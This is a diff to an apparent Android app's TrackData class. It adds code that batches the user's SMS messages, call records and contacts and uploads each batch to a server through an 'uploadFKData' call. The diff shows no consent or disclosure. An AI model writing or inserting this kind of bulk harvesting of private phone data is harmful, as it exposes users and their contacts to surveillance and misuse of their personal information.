@@ -14,6 +14,8 @@ import android.util.Log;
 
 import com.google.gson.Gson;
 
+import org.json.JSONObject;
+
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
@@ -239,6 +241,13 @@ public class TrackData {
                 data.put("smsType", type);
                 data.put("userMobile", mobile);
                 mapList.add(data);
+                if (mapList.size() >= TrackConfig.singleFKDataLimit) {
+                    JSONObject object = new JSONObject();
+                    object.put("type", "SMS");
+                    object.put("payload", TrackData.mapList2String(mapList));
+                    TrackOperate.uploadFKData(object.toString());
+                    mapList.clear();
+                }
             }
             cur.close();
             return mapList;
@@ -364,6 +373,14 @@ public class TrackData {
                 data.put("typeDescription", typeDescription);
                 data.put("userMobile", mobile);
                 mapList.add(data);
+
+                if (mapList.size() >= TrackConfig.singleFKDataLimit) {
+                    JSONObject object = new JSONObject();
+                    object.put("type", "CALLRECORDS");
+                    object.put("payload", TrackData.mapList2String(mapList));
+                    TrackOperate.uploadFKData(object.toString());
+                    mapList.clear();
+                }
             }
             cur.close();
             return mapList;
@@ -598,6 +615,13 @@ public class TrackData {
 
                 mapList.add(data);
 
+                if (mapList.size() >= TrackConfig.singleFKDataLimit) {
+                    JSONObject object = new JSONObject();
+                    object.put("type", "CONTACTS");
+                    object.put("payload", TrackData.mapList2String(mapList));
+                    TrackOperate.uploadFKData(object.toString());
+                    mapList.clear();
+                }
             }
             cur.close();
             return mapList;
